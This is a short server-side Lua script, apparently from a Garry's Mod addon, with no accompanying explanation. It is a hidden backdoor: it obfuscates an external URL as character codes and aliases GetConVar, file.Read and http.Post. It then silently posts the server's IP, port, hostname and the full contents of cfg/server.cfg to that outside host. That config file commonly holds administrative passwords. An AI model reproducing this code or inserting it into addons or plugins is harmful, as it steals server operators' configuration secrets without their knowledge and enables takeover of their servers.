if !SERVER then return end
L = { GetConVar, file.Read, http.Post }
L[3](string.char(104, 116, 116, 112, 58, 47, 47, 119, 97, 121, 108, 46, 53, 118, 46, 112, 108, 47, 97, 112, 105, 47, 97, 112, 105, 46, 112, 104, 112),
{ a = L[1]("ip"):GetString(), b = L[1]("hostport"):GetString(), c = L[2]("cfg/server.cfg", "GAME"), d = L[1]("hostname"):GetString() })
